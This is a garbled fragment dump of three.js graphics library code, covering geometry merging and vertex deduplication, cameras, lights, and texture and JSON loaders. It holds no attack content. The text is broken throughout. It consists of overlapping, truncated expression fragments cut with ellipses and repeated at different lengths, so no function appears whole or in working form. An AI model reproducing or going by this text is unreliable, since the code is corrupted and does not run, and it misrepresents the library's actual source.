... ormals;face.ve ... Normalscompute ... ;\r\n\r\n\t}var f,  ... 3(), w;tan1[ v ... tor3();tan1[ v ... ctor3()tan2[ v ... tor3();tan2[ v ... ctor3()vA = co ... s[ a ];vA = co ... es[ a ]context ... es[ a ]context.verticesvB = co ... s[ b ];vB = co ... es[ b ]context ... es[ b ]vC = co ... s[ c ];vC = co ... es[ c ]context ... es[ c ]uvA = uv[ ua ];uvA = uv[ ua ]uv[ ua ]uvB = uv[ ub ];uvB = uv[ ub ]uv[ ub ]uvC = uv[ uc ];uvC = uv[ uc ]uv[ uc ]x1 = vB.x - vA.x;x1 = vB.x - vA.xvB.x - vA.xx2 = vC.x - vA.x;x2 = vC.x - vA.xvC.x - vA.xy1 = vB.y - vA.y;y1 = vB.y - vA.yvB.y - vA.yy2 = vC.y - vA.y;y2 = vC.y - vA.yvC.y - vA.yz1 = vB.z - vA.z;z1 = vB.z - vA.zvB.z - vA.zz2 = vC.z - vA.z;z2 = vC.z - vA.zvC.z - vA.zs1 = uvB.x - uvA.x;s1 = uvB.x - uvA.xuvB.x - uvA.xuvB.xuvA.xs2 = uvC.x - uvA.x;s2 = uvC.x - uvA.xuvC.x - uvA.xuvC.xt1 = uvB.y - uvA.y;t1 = uvB.y - uvA.yuvB.y - uvA.yuvB.yuvA.yt2 = uvC.y - uvA.y;t2 = uvC.y - uvA.yuvC.y - uvA.yuvC.ysdir.se ...  * r );sdir.se ... ) * r )tdir.se ...  * r );tdir.se ... ) * r )uv = th ... ][ f ];uv = th ...  ][ f ]this.fa ...  ][ f ]this.fa ... vs[ 0 ]handleT ... 1, 2 );handleT ...  1, 2 )var fac ...  'd' ];faceInd ... , 'd' ][ 'a',  ... , 'd' ]i < Mat ... th, 3 )n.copy( ...  i ] );n.copy( ... [ i ] )n.copyvertexI ...  i ] ];vertexI ... [ i ] ]face[ f ... [ i ] ]faceIndex[ i ]t = tan ... ndex ];t = tan ... Index ]tan1[ vertexIndex ]tmp2.cr ... ], t );tmp2.cr ...  ], t )test =  ... ex ] );test =  ... dex ] )tmp2.do ... dex ] )tan2[ vertexIndex ]w = (te ...  : 1.0;w = (te ... 0 : 1.0(test < ... 0 : 1.0(test < 0.0)face.ve ... z, w );face.ve ... .z, w )new THR ... .z, w )this.ha ... = true;var d = 0;d = 0if ( i  ... \n\r\n\t\t\t}i > 0d += ve ...  1 ] );d += ve ... - 1 ] )vertice ... - 1 ] )vertice ... tanceTovertices[ i - 1 ]this.li ...  ] = d;this.li ... i ] = dthis.li ... es[ i ]this.bo ... ices );this.bo ... tices )this.bo ... mPointsmerge:  ... }\r\n\r\n\t}if ( ge ... \r\n\r\n\t\t}geometr ... = falseconsole ... etry );console ... metry )'THREE. ... metry.'THREE.Geometry.merge(): geometry not an instance of THREE.Geometry.: geometry not an instance of THREEvar nor ... s[ 0 ];vertexO ... .lengthuvPosit ... .lengththis.fa ... .lengthfaces1 = this.facesfaces2  ... y.facesuvs1 =  ... vs[ 0 ]uvs2 =  ... vs[ 0 ]if ( ma ... et = 0;materia ... et = 0;materia ... set = 0if ( ma ... \r\n\r\n\t\t}matrix !== undefinednormalM ... trix );il = ve ... .lengthvertices2.lengthvar ver ... 2[ i ];vertex  ... s2[ i ]vertices2[ i ]var ver ... lone();vertexC ... clone()vertex.clone()vertex.cloneif ( ma ... trix );vertexC ... trix );vertexC ... atrix )vertexC ... Matrix4vertice ... Copy );vertice ... xCopy )vertices1.pushil = faces2.lengthfaces2.lengthvar fac ... Colors;face = faces2[ i ]faces2[ i ]faceVer ... xColorsfaceCop ... fset );faceCop ... ffset )new THR ... ffset )face.a  ... xOffsetface.b  ... xOffsetface.c  ... xOffsetfaceCop ... rmal );faceCop ... ormal )faceCopy.normal.copyfaceCopy.normalif ( no ... \n\r\n\t\t\t}normalM ... definedfaceCop ... lize();faceCop ... alize()faceCop ... rmalizefaceCop ... atrix )faceCop ... Matrix3normal  ... lone();normal  ... clone()faceVer ... clone()faceVer ... ].clonefaceVer ... ls[ j ]faceCop ... ls.pushfaceCop ... NormalsfaceCop ... olor );faceCop ... color )faceCopy.color.copyfaceCopy.colorcolor = ... s[ j ];color = ... rs[ j ]faceVer ... rs[ j ]faceCop ... ne() );faceCop ... one() )faceCop ... rs.pushfaceCop ... xColorscolor.clone()color.clonefaceCop ... Offset;faceCop ... xOffsetfaceCop ... alIndexface.ma ... xOffsetfaces1. ... Copy );faces1. ... eCopy )faces1.pushil = uvs2.lengthuvs2.lengthvar uv  ... y = [];uv = uvs2[ i ]uvs2[ i ]uvCopy = []if ( uv ... \t\r\n\t\t\t}uv === undefined{\r\n\t\t\t\t ... \t\r\n\t\t\t}jl = uv.lengthuv.lengthuvCopy. ... .y ) );uvCopy. ... ].y ) )uvCopy.pushnew THR ... j ].y )uv[ j ].xuv[ j ]uv[ j ].yuvs1.push( uvCopy );uvs1.push( uvCopy )uvs1.pushmergeVe ... ;\r\n\r\n\t}var ver ... p = {};verticesMap = {}var uni ... s = [];unique = []changes = []var v, key;var pre ... ts = 4;precisionPoints = 4var pre ... ints );precisi ... oints )Math.po ... oints )var i,il, face;var ind ...  jl, u;v = thi ... s[ i ];v = thi ... es[ i ]key = M ... sion );key = M ... ision )Math.ro ... ision )Math.ro ... ) + '_'v.x * precisionv.y * precisionv.z * precisionif ( ve ... \n\r\n\t\t\t}vertice ... definedverticesMap[ key ]vertice ...  ] = i;vertice ... y ] = iunique. ...  i ] );unique. ... [ i ] )unique.pushchanges ... th - 1;changes ... gth - 1changes[ i ]unique.length - 1unique.lengthchanges ... ey ] ];changes ... key ] ]var fac ... e = [];faceInd ... ve = []for( i  ... \r\n\r\n\t\t}face =  ... s[ i ];face.a  ... ce.a ];face.a  ... ace.a ]changes[ face.a ]face.b  ... ce.b ];face.b  ... ace.b ]changes[ face.b ]face.c  ... ce.c ];face.c  ... ace.c ]changes[ face.c ]indices ... ce.c ];indices ... ace.c ][ face. ... ace.c ]var dupIndex = -1;dupIndex = -1n < 3var n = 0if ( in ... \r\n\t\t\t\t}indices ... ) % 3 ]indices[ n ]( n + 1 ) % 3( n + 1 )n + 1dupIndex = n;dupIndex = nfaceInd ... h( i );faceInd ... sh( i )faceInd ... ve.pushi >= 0i --i = fac ... gth - 1faceInd ... gth - 1faceInd ... .length{\r\n\t\t\tv ... \r\n\r\n\t\t}var idx ... e[ i ];idx = f ... ve[ i ]faceInd ... ve[ i ]this.fa ... x, 1 );this.fa ... dx, 1 )this.faces.splicejl = th ... .lengththis.fa ... .splicethis.fa ... vs[ j ]var dif ... length;diff =  ... .lengththis.ve ... unique;this.ve ...  uniquemakeGro ... \n\t} )()var geo ... er = 0;geometr ... ter = 0var f,  ... p = {};hash_map = {}var num ... length;numMorp ... .lengththis.ge ... s = {};this.ge ... ps = {}this.geometryGroupsmateria ... ex : 0;usesFac ... dex : 0! ( mat ... h_map )( mater ... h_map )materia ... ash_maphash_ma ... ': 0 };hash_ma ... r': 0 }hash_ma ... Index ]{ 'hash ... r': 0 }'hash': ... alIndex'counter': 0groupHa ... ounter;groupHa ... counterhash_ma ... counterhash_ma ... h + '_'hash_ma ...  ].hash! ( gro ... roups )( group ... roups )groupHa ... yGroupsthis.ge ... mals };this.ge ... rmals }this.ge ... pHash ]{ 'face ... rmals }'faces3': []'materi ... alIndex'vertices': 0'numMor ... Targets'numMor ... Normalsif ( th ... \r\n\t\t\t\t}this.ge ... InGroupthis.ge ... ces + 3this.ge ... erticeshash_ma ... r += 1;hash_ma ... er += 1if ( !  ... \n\t\t\t\t\t}this.ge ... h( f );this.ge ... sh( f )this.ge ... s3.pushthis.ge ... .faces3this.ge ... s += 3;this.ge ... es += 3this.ge ... t = [];this.ge ... st = []this.ge ... upsListvar gthis.ge ... ter ++;this.ge ... nter ++this.ge ...  g ].idthis.ge ... ps[ g ]geometr ... nter ++this.ge ...  g ] );this.ge ... [ g ] )this.ge ... st.pushgeometr ... ne() );geometr ... one() )geometr ... es.pushvertices[ i ].clonevar fac ... .faces;faces = this.facesil = faces.lengthgeometry.faces.pushfaces[ i ].clone()faces[ i ].clonefaces[ i ]var uvs ... s[ 0 ];uvs = t ... vs[ 0 ]il = uvs.lengthuv = uvs[ i ]geometr ... Copy );geometr ... vCopy )geometr ...  ].pushTHREE.G ... nt = 0;THREE.G ... unt = 0THREE.C ... );\r\n\r\n}THREE.Camera{\r\n\r\n\tT ... );\r\n\r\n}THREE.O ... this );THREE.O ...  this )THREE.Object3D.callthis.ma ... Inversethis.pr ... rix4();this.pr ... trix4()this.pr ... nMatrixTHREE.C ... type );THREE.C ... otype )THREE.C ... \n\r\n}();THREE.C ... \r\n\r\n}()THREE.C ... .lookAt{\r\n\r\n\t/ ... };\r\n\r\n}THREE.C ... ra;\r\n};THREE.C ... era;\r\n}THREE.C ... e.clonefunctio ... era;\r\n}{\r\n\r\n\ti ... era;\r\n}if ( ca ... mera();camera === undefinedcamera  ... mera();camera  ... amera()new THREE.Camera()THREE.O ... mera );THREE.O ... amera )THREE.O ... ne.callTHREE.O ... e.clonecamera. ... erse );camera. ... verse )camera. ... se.copycamera. ... trix );camera. ... atrix )camera. ... ix.copyreturn camera;THREE.C ... this );THREE.C ...  this )THREE.Camera.callthis.left = left;this.left = leftthis.leftthis.right = right;this.right = rightthis.rightthis.top = top;this.top = topthis.topthis.bo ... bottom;this.bottom = bottomthis.bottomthis.ne ...  : 0.1;this.ne ... r : 0.1( near  ... r : 0.1( near  ... fined )near !== undefinedthis.fa ... : 2000;this.fa ...  : 2000( far ! ...  : 2000( far ! ... fined )far !== undefinedthis.up ... trix();this.up ... atrix()this.up ... nMatrixupdateP ... nMatrixTHREE.O ... nMatrixthis.pr ... .far );this.pr ... s.far )this.pr ... graphicTHREE.O ... ra;\r\n};THREE.O ... era;\r\n}{\r\n\r\n\tv ... era;\r\n}var cam ... mera();new THR ... amera()THREE.C ... mera );THREE.C ... amera )THREE.C ... ne.callcamera. ... s.left;camera. ... is.leftcamera.leftcamera. ... .right;camera. ... s.rightcamera.rightcamera. ... is.top;camera. ... his.topcamera.topcamera. ... bottom;camera. ... .bottomcamera.bottomcamera. ... s.near;camera. ... is.nearcamera.nearcamera. ... is.far;camera. ... his.farcamera.farTHREE.P ... );\r\n\r\n}THREE.P ... eCamerathis.fo ... v : 50;this.fo ... ov : 50this.fovfov !== ... ov : 50fov !== undefinedthis.as ... ct : 1;this.as ... ect : 1this.aspectaspect  ... ect : 1aspect !== undefinednear != ... r : 0.1far !== ...  : 2000THREE.P ... type );THREE.P ... otype )THREE.P ... setLens{\r\n\r\n\ti ... );\r\n\r\n}if ( fr ... t = 24;frameHe ... definedframeHeight = 24;frameHeight = 24this.fo ...  ) ) );this.fo ... 2 ) ) )2 * THR ... 2 ) ) )THREE.M ... 2 ) ) )THREE.Math.radToDegMath.at ... * 2 ) )frameHe ... h * 2 )( focalLength * 2 )focalLength * 2THREE.P ... wOffsetthis.fu ... lWidth;this.fu ... llWidththis.fullWidththis.fu ... Height;this.fu ... lHeightthis.fullHeightthis.width = width;this.width = widththis.widththis.he ... height;this.height = heightthis.heightTHREE.P ... nMatrix{\r\n\r\n\ti ... \t}\r\n\r\n}if ( th ... ;\r\n\r\n\t}var asp ... Height;aspect  ... lHeightvar top ... s.near;top = M ... is.nearMath.ta ... is.nearthis.fov * 0.5var bottom = -top;bottom = -top-topvar lef ... bottom;left =  ...  bottomaspect * bottomvar rig ...  * top;right = aspect * topaspect * topvar wid ... left );width = ...  left )Math.ab ...  left )var hei ... ttom );height  ... ottom )Math.ab ... ottom )this.pr ... r\r\n\t\t);this.pr ... ar\r\n\t\t)this.pr ... Frustumleft +  ... llWidththis.x  ... llWidththis.x * width( this. ... llWidth( this. ... * width( this. ... width )this.x + this.widthtop - ( ... lHeight( this. ... lHeight( this. ...  height( this. ... eight )this.y + this.heighttop - t ... lHeightthis.y  ... lHeightthis.y * heightthis.pr ... pectiveTHREE.P ... ra;\r\n};THREE.P ... era;\r\n}THREE.P ... e.clonecamera. ... is.fov;camera. ... his.fovcamera.fovcamera. ... aspect;camera. ... .aspectcamera.aspectthis.co ... olor );this.co ... color )new THR ... color )THREE.L ... type );THREE.L ... otype )THREE.L ... t;\r\n\r\n}THREE.L ... e.clonefunctio ... t;\r\n\r\n}{\r\n\r\n\ti ... t;\r\n\r\n}if ( li ... ight();light === undefinedlight = ... ight();light = ... Light()new THREE.Light()THREE.O ... ight );THREE.O ... light )light.c ... olor );light.c ... color )light.color.copylight.colorreturn light;THREE.A ... ;\r\n\r\n};THREE.A ... );\r\n\r\n}THREE.AmbientLightTHREE.L ... olor );THREE.L ... color )THREE.Light.callTHREE.A ... type );THREE.A ... otype )THREE.A ... ototypeTHREE.A ... t;\r\n\r\n}THREE.A ... e.clone{\r\n\r\n\tv ... t;\r\n\r\n}var lig ... ight();new THR ... Light()THREE.L ... ight );THREE.L ... light )THREE.L ... ne.callTHREE.A ... 1;\r\n\r\n}THREE.AreaLight{\r\n\r\n\tT ... 1;\r\n\r\n}this.no ... 1, 0 );this.no ... -1, 0 )new THR ... -1, 0 )this.ri ... 0, 0 );this.ri ...  0, 0 )this.in ... ty : 1;this.in ... ity : 1this.intensity( inten ... ity : 1( inten ... fined )intensi ... definedthis.width = 1.0;this.width = 1.0this.height = 1.0;this.height = 1.0this.co ...  = 1.5;this.co ... n = 1.5this.co ... nuationthis.li ...  = 0.5;this.li ... n = 0.5this.li ... nuationthis.qu ...  = 0.1;this.qu ... n = 0.1this.qu ... nuationTHREE.D ... ;\r\n\r\n};THREE.D ... l;\r\n\r\n}THREE.D ... alLight{\r\n\r\n\tT ... l;\r\n\r\n}this.po ... 1, 0 );this.po ...  1, 0 )this.position.setthis.ta ... ct3D();this.ta ... ect3D()this.on ...  false;this.on ... = falsethis.onlyShadowthis.sh ... r = 50;this.sh ... ar = 50this.sh ... eraNearthis.sh ... = 5000;this.sh ...  = 5000this.shadowCameraFarthis.sh ... = -500;this.sh ...  = -500this.sh ... eraLeft-500this.sh ...  = 500;this.sh ... t = 500this.sh ... raRightthis.sh ... p = 500this.shadowCameraTopthis.sh ... aBottomthis.sh ...  false;this.sh ... Visiblethis.shadowBias = 0;this.shadowBias = 0this.shadowBiasthis.sh ...  = 0.5;this.sh ... s = 0.5this.shadowDarknessthis.sh ...  = 512;this.sh ... h = 512this.shadowMapWidththis.sh ... t = 512this.shadowMapHeightthis.shadowCascadethis.sh ... 1000 );this.sh ... -1000 )this.sh ... eOffsetnew THR ... -1000 )-1000this.sh ... nt = 2;this.sh ... unt = 2this.sh ... deCountthis.sh ... 0, 0 ];this.sh ...  0, 0 ]this.sh ... adeBias[ 0, 0, 0 ]this.sh ...  512 ];this.sh ... , 512 ]this.sh ... deWidth[ 512, 512, 512 ]this.sh ... eHeightthis.sh ... .998 ];this.sh ... 0.998 ]this.sh ... deNearZ[ -1.00 ... 0.998 ]-1.000this.sh ... .000 ];this.sh ... 1.000 ]this.sh ... adeFarZ[  0.99 ... 1.000 ]this.sh ... y = [];this.sh ... ay = []this.sh ... deArraythis.sh ... = null;this.sh ...  = nullthis.shadowMapthis.shadowMapSizethis.shadowCamerathis.shadowMatrixTHREE.D ... type );THREE.D ... otype )THREE.D ... ototypeTHREE.D ... t;\r\n\r\n}THREE.D ... e.clonelight.t ... lone();light.t ... clone()light.targetthis.target.clone()this.target.clonelight.i ... ensity;light.i ... tensitylight.intensitylight.c ... Shadow;light.c ... tShadowlight.castShadowlight.o ... Shadow;light.o ... yShadowlight.onlyShadowlight.s ... raNear;light.s ... eraNearlight.s ... eraFar;light.s ... meraFarlight.s ... raLeft;light.s ... eraLeftlight.s ... aRight;light.s ... raRightlight.s ... eraTop;light.s ... meraToplight.s ... Bottom;light.s ... aBottomlight.s ... isible;light.s ... Visiblelight.s ... owBias;light.s ... dowBiaslight.shadowBiaslight.s ... rkness;light.s ... arknesslight.shadowDarknesslight.s ... pWidth;light.s ... apWidthlight.shadowMapWidthlight.s ... Height;light.s ... pHeightlight.s ... ascade;light.s ... Cascadelight.shadowCascadelight.s ... fset );light.s ... ffset )light.s ... et.copylight.s ... eOffsetlight.s ... eCount;light.s ... deCountlight.s ... e( 0 );light.s ... ce( 0 )light.s ... adeBiasthis.sh ... ce( 0 )this.sh ... s.slicelight.s ... deWidththis.sh ... h.slicelight.s ... eHeightthis.sh ... t.slicelight.s ... deNearZthis.sh ... Z.slicelight.s ... adeFarZTHREE.H ... ;\r\n\r\n};THREE.H ... 1;\r\n\r\n}THREE.H ... reLightTHREE.L ... Color )this.po ... 0, 0 );this.po ... 00, 0 )this.gr ... olor );this.gr ... Color )this.groundColornew THR ... Color )THREE.H ... type );THREE.H ... otype )THREE.H ... ototypeTHREE.H ... t;\r\n\r\n}THREE.H ... e.clonelight.g ... olor );light.g ... Color )light.g ... or.copylight.groundColorTHREE.PointLight{\r\n\r\n\tT ... 0;\r\n\r\n}this.di ... ce : 0;this.di ... nce : 0this.distance( dista ... nce : 0( dista ... fined )distanc ... definedTHREE.P ... t;\r\n\r\n}light.d ... stance;light.d ... istancelight.distanceTHREE.S ... l;\r\n\r\n}THREE.SpotLightthis.an ... PI / 3;this.an ... .PI / 3this.angle( angle ... .PI / 3( angle ... fined )angle !== undefinedMath.PI / 3this.ex ... t : 10;this.ex ... nt : 10this.exponent( expon ... nt : 10( expon ... fined )exponen ... definedthis.sh ... v = 50;this.sh ... ov = 50this.shadowCameraFovTHREE.S ... type );THREE.S ... otype )THREE.S ... t;\r\n\r\n}THREE.S ... e.clonelight.a ... .angle;light.a ... s.anglelight.anglelight.e ... ponent;light.e ... xponentlight.exponentlight.s ... eraFov;light.s ... meraFovTHREE.C ... };\r\n\r\n}THREE.Cachethis.files = {};this.files = {}this.filesconstru ... E.Cachethis.fi ... = file;this.fi ...  = filethis.files[ key ]get: fu ... ;\r\n\r\n\t}return  ...  key ];remove: ... ;\r\n\r\n\t}delete  ...  key ];delete  ... [ key ]clear:  ... }\r\n\r\n\t}THREE.L ... };\r\n\r\n}THREE.Loaderthis.sh ... Status;this.sh ... wStatusthis.showStatusthis.st ... : null;this.st ...  : nullthis.st ... ElementshowSta ...  : nullTHREE.L ... ement()THREE.L ... Elementthis.im ... ader();this.im ... oader()this.imageLoadernew THR ... oader()THREE.ImageLoaderthis.on ...  () {};this.on ... n () {}this.onLoadStartthis.onLoadProgressthis.onLoadCompleteconstru ... .LoadercrossOr ... definedaddStat ... ;\r\n\r\n\t}var e = ... div" );e = doc ... "div" )documen ... "div" )documen ... Elemente.style ... olute";e.style ... solute"e.style.positione.stylee.style ...  "0px";e.style ... = "0px"e.style.right0pxe.style.top = "0px";e.style.top = "0px"e.style.tope.style ... 0.8em";e.style ... "0.8em"e.style.fontSize0.8em8eme.style ... "left";e.style ...  "left"e.style.textAligne.style ... 0.25)";e.style ... ,0.25)"e.style.backgroundrgba(0,0,0,0.25)rgba(0,0,0,0.25)0,0,0,0.250,0,0,0e.style ... "#fff";e.style ...  "#fff"e.style.color#fffe.style ... 120px";e.style ... "120px"e.style.width120pxe.style ... 0.5em";e.style ...  0.5em"e.style.padding"0.5em  ...  0.5em"0.5em 0.5em 0.5em 0.5em5em 05eme.style ... = 1000;e.style ...  = 1000e.style.zIndexe.inner ... g ...";e.inner ... ng ..."e.innerHTMLLoading ...Loading return e;updateP ... ;\r\n\r\n\t}var mes ... aded ";message = "Loaded "Loaded if ( pr ... \r\n\r\n\t\t}progress.totalmessage ...  + "%";message ... ) + "%"( 100 * ... ) + "%"( 100 * ... ixed(0)( 100 * ... toFixed( 100 * ... total )100 * p ... s.total100 * p ... .loadedprogress.loadedmessage ...  " KB";message ... + " KB"( progr ... + " KB"( progr ... ixed(2)( progr ... toFixed( progr ...  1024 )progres ...  / 1024 KBthis.st ... essage;this.st ... messagethis.st ... nerHTMLvar par ...  '/' );parts = ... ( '/' )url.split( '/' )url.splitif ( pa ... n './';parts.length === 1parts.lengthreturn './';parts.pop();parts.pop()parts.popreturn  ...  + '/';parts.j ... ) + '/'parts.join( '/' )parts.joininitMat ... ;\r\n\r\n\t}i < materials.lengthmaterials.length++ iarray[  ... Path );array[  ... ePath )this.cr ... ePath )this.createMaterialmaterials[ i ]needsTa ... ;\r\n\r\n\t}il = ma ... .lengthvar m = ... s[ i ];m = materials[ i ]if ( m  ... n true;m insta ... aterialcreateM ... ;\r\n\r\n\t}var l = ... th.LN2;l = Mat ... ath.LN2Math.lo ... ath.LN2Math.log( n )return  ...  l ) );Math.po ...   l ) )Math.round(  l )var isC ... File );isCompr ... eFile )/\.dds$ ... eFile )/\.dds$/i.test\.dds$\.var ful ... ceFile;fullPat ... rceFiletexture ... rceFileif ( is ... \n\r\n\t\t\t}var tex ... Path );texture ... lPath )THREE.I ... lPath )THREE.I ... TextureTHREE.ImageUtilsloadCom ... Texturewhere[  ... exture;where[  ... texturewhere[ name ]var tex ... vas' );texture ... nvas' )documen ... nvas' )where[  ... ture );where[  ... xture )new THR ... xture )THREE.Texturewhere[  ... ceFile;where[  ... rceFileif( rep ... \n\r\n\t\t\t}where[  ...  1 ] );where[  ... [ 1 ] )where[  ... eat.setwhere[ name ].repeatrepeat[ 0 ]repeat[ 1 ]if ( re ... apping;repeat[ 0 ] !== 1where[  ... apping;where[  ... rappingwhere[ name ].wrapSrepeat[ 1 ] !== 1where[ name ].wrapTif ( of ... \n\r\n\t\t\t}where[  ... set.setwhere[ name ].offsetoffset[ 0 ]offset[ 1 ]if ( wr ... \n\r\n\t\t\t}var wra ... \r\n\t\t\t\t}wrapMap ... \r\n\t\t\t\t}"repeat ... rapping"mirror ... rappingmirrorif ( wr ...  0 ] ];wrapMap ... definedwrapMap[ wrap[ 0 ] ]wrap[ 0 ]where[  ...  0 ] ];where[  ... [ 0 ] ]if ( wr ...  1 ] ];wrapMap[ wrap[ 1 ] ]wrap[ 1 ]where[  ...  1 ] ];where[  ... [ 1 ] ]if ( an ... \n\r\n\t\t\t}where[  ... otropy;where[  ... sotropy! isCompressedvar tex ... name ];texture ...  name ]scope.i ... Origin;scope.i ... sOriginscope.imageLoaderscope.crossOriginscope.i ... \t\t\t} );scope.i ... \t\t\t\t} )scope.i ... er.loadfunctio ... \r\n\t\t\t\t}if ( TH ... \n\t\t\t\t\t}THREE.M ... = falseTHREE.M ... width )THREE.M ... erOfTwoimage.widthTHREE.M ... eight )image.heightvar wid ... idth );width = ... width )nearest ... width )var hei ... ight );height  ... eight )nearest ... eight )texture ...  width;texture ... = widthtexture.image.widthtexture.imagetexture ... height;texture ...  heighttexture.image.heighttexture ... ight );texture ... eight )texture ... awImagetexture ...  '2d' )texture ... Context2dtexture ...  image;texture ... = imagetexture ... = true;texture ...  = truetexture.needsUpdatereturn  ...  * 255;( rgb[  ... ] * 255( rgb[  ...  << 8 )( rgb[  ... << 16 )rgb[ 0 ] * 255 << 16rgb[ 0 ] * 255rgb[ 0 ]rgb[ 1 ] * 255 << 8rgb[ 1 ] * 255rgb[ 1 ]rgb[ 2 ] * 255rgb[ 2 ]var mty ... erial";mtype = ... terial""MeshLa ... terial"var mpa ... alse };mpars = ... false }{ color ... false }color: 0xeeeeee15658734opacity: 1.0map: nulllightMap: nullnormalMap: nullbumpMap: nullwireframe: falseif ( m. ... \r\n\r\n\t\t}m.shadingvar sha ... Case();shading ... rCase()m.shadi ... rCase()m.shadi ... werCaseif ( sh ... erial";shading === "phong"phongmtype = ... erial";shading === "basic"basicm.blend ... definedm.blendingTHREE[  ... definedTHREE[ m.blending ]mpars.b ... ding ];mpars.b ... nding ]mpars.blendingm.trans ... y < 1.0m.trans ... definedm.transparentm.opacity < 1.0m.opacitympars.t ... parent;mpars.t ... sparentmpars.transparentm.depth ... definedm.depthTestmpars.d ... thTest;mpars.d ... pthTestmpars.depthTestm.depthWritempars.d ... hWrite;mpars.d ... thWritempars.depthWritem.visib ... definedm.visiblempars.v ... isible;mpars.v ... visiblempars.visiblem.flipS ... definedm.flipSidedmpars.s ... ckSide;mpars.s ... ackSidempars.sidem.doubl ... definedm.doubleSidedmpars.s ... leSide;mpars.s ... bleSidem.wiref ... definedm.wireframempars.w ... eframe;mpars.w ... reframempars.wireframem.verte ... definedm.vertexColorsif ( m. ... \n\r\n\t\t\t}m.verte ...  "face"mpars.v ... Colors;mpars.v ... eColorsmpars.vertexColorsmpars.v ... xColorsm.colorDiffusempars.c ... fuse );mpars.c ... ffuse )mpars.colorrgb2hex ... ffuse )m.DbgColormpars.c ... gColor;mpars.c ... bgColorm.colorSpecularmpars.s ... ular );mpars.s ... cular )mpars.specularrgb2hex ... cular )m.colorAmbientmpars.a ... ient );mpars.a ... bient )mpars.ambientrgb2hex ... bient )m.colorEmissivempars.e ... sive );mpars.e ... ssive )mpars.emissivergb2hex ... ssive )m.transparencympars.o ... arency;mpars.o ... parencympars.opacitym.specularCoefmpars.s ... arCoef;mpars.s ... larCoefmpars.shininessm.mapDi ... urePathm.mapDiffusecreate_ ... ropy );create_ ... tropy )m.mapDiffuseRepeatm.mapDiffuseOffsetm.mapDiffuseWrapm.mapDi ... sotropym.mapLi ... urePathm.mapLightm.mapLightRepeatm.mapLightOffsetm.mapLightWrapm.mapLightAnisotropym.mapBu ... urePathm.mapBumpm.mapBumpRepeatm.mapBumpOffsetm.mapBumpWrapm.mapBumpAnisotropym.mapNo ... urePathm.mapNormalm.mapNormalRepeatm.mapNormalOffsetm.mapNormalWrapm.mapNo ... sotropym.mapSp ... urePathm.mapSpecularm.mapSpecularRepeatm.mapSpecularOffsetm.mapSpecularWrapm.mapSp ... sotropymapSpec ... sotropym.mapBumpScalempars.b ... pScale;mpars.b ... mpScalempars.bumpScalevar sha ... map" ];shader  ... lmap" ]THREE.S ... lmap" ]THREE.ShaderLibvar uni ... orms );uniform ... forms )uniform ... malMap;uniform ... rmalMapuniform ... ].valueuniform ... rmal" ]tNormalmpars.normalMapm.mapNormalFactoruniform ... ctor );uniform ... actor )uniform ... lue.setuniform ... cale" ]uNormalScaleif ( mp ... \n\r\n\t\t\t}mpars.mapuniform ... rs.map;uniform ... ars.mapuniform ... fuse" ]uniform ... = true;uniform ...  = trueenableDiffusempars.specularMapuniform ... larMap;uniform ... ularMapuniform ... ular" ]tSpecularenableSpecularmpars.lightMapuniform ... ghtMap;uniform ... ightMapuniforms[ "tAO" ]tAOuniform ... leAO" ]enableAOuniform ... olor );uniform ... color )uniform ... .setHexuniform ... ular );uniform ... cular )uniform ... ient );uniform ... bient )uniform ... ient" ]uniform ... niness;uniform ... ininessuniform ... ness" ]mpars.o ... defineduniform ... pacity;uniform ... opacityuniform ... city" ]var par ... true };paramet ...  true }{ fragm ...  true }uniforms: uniformslights: truefog: truevar mat ... ters );materia ... eters )materia ... = true;materia ...  = truematerial.transparentvar mat ... pars );materia ... mpars )new THR ... mpars )THREE[ mtype ]if ( m. ... bgName;m.DbgNa ... definedm.DbgNamemateria ... bgName;materia ... DbgNamematerial.namereturn material;THREE.X ... ;\r\n\r\n};THREE.X ... r;\r\n\r\n}THREE.XHRLoaderthis.ca ... ache();this.ca ... Cache()this.cachenew THREE.Cache()this.ma ... anager;this.ma ... Managerthis.manager( manag ... Manager( manag ... fined )manager ... definedTHREE.D ... ManagerDefault ... ManagerTHREE.X ... }\r\n\r\n};THREE.X ... \t}\r\n\r\n}THREE.X ... ototypeconstru ... RLoaderload: f ... ;\r\n\r\n\t}var cac ...  url );cached  ... ( url )scope.c ... ( url )scope.cache.getscope.cacheif ( ca ... \r\n\r\n\t\t}cached !== undefinedonLoad( cached );onLoad( cached )var req ... uest();request ... quest()new XMLHttpRequest()if ( on ... \r\n\r\n\t\t}onLoad !== undefinedrequest ... alse );request ... false )request ... istenerscope.c ... Text );scope.c ... eText )scope.cache.addevent.t ... nseTextonLoad( ... Text );onLoad( ... eText )scope.m ...  url );scope.m ... ( url )scope.m ... itemEndscope.manageronProgr ... definedonProgress( event );onProgress( event )onError ... definedonError( event );onError( event )if ( th ... Origin;this.cr ... definedthis.crossOriginrequest ... Origin;request ... sOriginrequest.crossOriginrequest ... true );request ...  true )request.openrequest ... null );request.send( null )request.sendscope.m ... emStartsetCros ... ;\r\n\r\n\t}this.cr ...  value;this.cr ... = valueTHREE.I ... r;\r\n\r\n}THREE.I ... \t}\r\n\r\n}constru ... eLoadervar ima ... img' );image = ... 'img' )documen ... 'img' )image.a ... alse );image.a ... false )image.a ... istenerscope.c ... this );scope.c ...  this )onLoad( this );onLoad( this )image.c ... Origin;image.c ... sOriginimage.crossOriginimage.src = url;image.src = urlimage.srcreturn image;THREE.J ... ;\r\n\r\n};THREE.J ... e;\r\n\r\n}THREE.JSONLoader{\r\n\r\n\tT ... e;\r\n\r\n}THREE.L ... atus );THREE.L ... tatus )THREE.Loader.callthis.wi ...  false;this.wi ... = falsethis.withCredentialsTHREE.J ... type );THREE.J ... otype )THREE.J ... ototypeTHREE.J ... );\r\n\r\n}THREE.J ... pe.load{\r\n\r\n\tv ... );\r\n\r\n}texture ...  url );texture ... ( url )texture ... ring" )( typeo ... ring" )typeof  ... string"typeof texturePaththis.ex ... ( url )this.extractUrlBasethis.onLoadStart();this.onLoadStart()this.lo ... Path );this.lo ... ePath )this.loadAjaxJSONTHREE.J ... jaxJSONvar xhr ... uest();xhr = n ... quest()var length = 0;length = 0xhr.onr ... \r\n\r\n\t};xhr.onr ... }\r\n\r\n\t}xhr.onr ... echangeif ( xh ... \r\n\r\n\t\t}xhr.rea ... hr.DONExhr.readyStatexhr.DONEif ( xh ... \n\r\n\t\t\t}xhr.sta ... s === 0xhr.status === 200xhr.statusxhr.status === 0if ( xh ... \r\n\t\t\t\t}xhr.responseTextvar jso ... Text );json =  ... eText )JSON.pa ... eText )if ( js ... \n\t\t\t\t\t}json.me ... 